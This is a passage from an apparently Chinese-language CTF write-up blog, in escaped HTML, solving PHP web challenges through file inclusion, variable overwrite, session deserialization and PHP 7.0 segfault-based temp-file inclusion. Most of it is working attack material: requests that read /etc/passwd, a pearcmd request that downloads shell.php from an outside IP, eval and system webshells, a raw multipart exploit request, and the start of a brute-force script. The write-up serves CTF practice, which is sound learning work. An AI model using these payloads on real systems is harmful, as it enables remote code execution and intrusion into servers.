&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5，是基于tp的框架&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()可以控制name和value参数，而紧跟着的view函数有点东西&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>可以看到最后的49行有文件写入的点，51行有个&lt;code>extract()&lt;/code>可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>可以正常回显&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
&lt;p>不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[强网拟态 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>不过这里要注意shell的写法，常规的&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>这样的是不行的，下载就会报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>执行也会报错，这里的shell要这样写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>之后直接把value的值换成flag文件名即可&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>————不过这里我直接写🐎一直成功不了，只能远程包含🐎&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_&amp;#39;+sessid
&lt;/code>&lt;/pre>&lt;h2 id="反序列化">反序列化&lt;/h2>
&lt;p>这里详细的讲解可以参照&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧&lt;/p>
&lt;p>首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;#34;stdClass&amp;#34;:0:{}
&lt;/code>&lt;/pre>&lt;p>时，&lt;code>php_serialize&lt;/code>方式下会被存储为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;|O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>但是被&lt;code>php&lt;/code>方式则会解析为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;=O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了&lt;code>PHPSESSID&lt;/code>之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上&lt;code>|&lt;/code>，内部的双引号要用&lt;code>\&lt;/code>进行转义&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>这个题得审&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">源码&lt;/a>&lt;/p>
&lt;p>有添加note 导出note的功能，但是却不是常见的xss（因为是php写的嘛），会检测session中的admin是不是true&lt;/p>
&lt;p>我们的突破口在导出.zip这个功能上&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>我们可以手动伪造一个session文件，之后将PHPSESSID设为生成的值即可，内容呢 就是admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>用&lt;code>xxxx|N;&lt;/code>闭合前面脏数据，编辑到title中，将session的PHPSESSID设置好就可以getflag了&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">这里是docker环境&lt;/a>（注意设置暴露端口 另外首页的index.php的submit要改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>这里有熟悉的&lt;code>call_user_func&lt;/code>，来读一下admin.php的源码&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再读一下function.php，但是好像这俩都没啥用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>，不过有个方式可以更改session存储目录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>那我们就可以把shell写到web根目录下&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;#34;aaa&amp;#34;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>拿到flag&lt;/p>
&lt;h4 id="解法2php70---lfi-via-segmentfault">解法2：php7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>参考：&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>可以导致php在执行过程中Segment Fault&lt;/p>
&lt;p>如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）&lt;/p>
&lt;p>利用exp（打出来502是正常情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: image/jpeg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上帝视角看的话是这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>用py脚本爆破出来(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
